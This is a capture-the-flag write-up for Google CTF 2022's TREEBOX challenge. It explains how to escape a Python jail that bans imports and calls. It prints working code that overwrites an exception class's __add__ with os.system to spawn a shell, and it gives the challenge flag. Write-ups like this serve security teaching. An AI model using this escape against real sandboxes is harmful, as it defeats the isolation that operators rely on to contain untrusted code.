# Google CTF 2022
## TREEBOX

> I think I finally got Python sandboxing right.

> [Attachment](https://github.com/03npan/ctf-write-ups/blob/main/google_ctf_2022/sandbox/treebox/treebox)

## Summary

Declare an arbitrary exception class to do remote code execution.

## Detailed Solution

It's hard to tell what we can do if we connect to the server given. To get some clues, open up the attachment with a text editor. The Python jail continues to read input until we pass "--END" to the program, after which it compiles the input. The function `verify_secure` then checks for "banned statements", which appear to be imports and function calls - thus code like `import os`, `from os import *` and `os.getcwd()` won't let us break out.

If we can't make any calls, how can we execute arbitrary functions to find the flag then? We can declare an arbitrary exception class and do remote code execution by abusing a "magic method":

```
# Declare arbitrary exception class
class Klecko(Exception):
  def __add__(self,algo):
    return 1

# Change add function
Klecko.__add__ = os.system

# Generate an object of the class with a try/except + raise
try:
  raise Klecko
except Klecko as k:
  k + "/bin/bash -i" #RCE abusing __add__
```

(Other "magic methods" like `__sub__` and `__mul__` can be abused in a similar fashion.)

Pass that code in, then pass "--END" to the server. We see that we don't get the error message, nor do we get our prompt back. Check with `ls`, and sure enough, the flag file is there for us to read using `cat`.

![solution.png](https://github.com/03npan/ctf-write-ups/blob/main/google_ctf_2022/sandbox/treebox/solution.png)

Flag: `CTF{CzeresniaTopolaForsycja}`

*Original sandbox escape code from [HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#python-execution-without-calls).*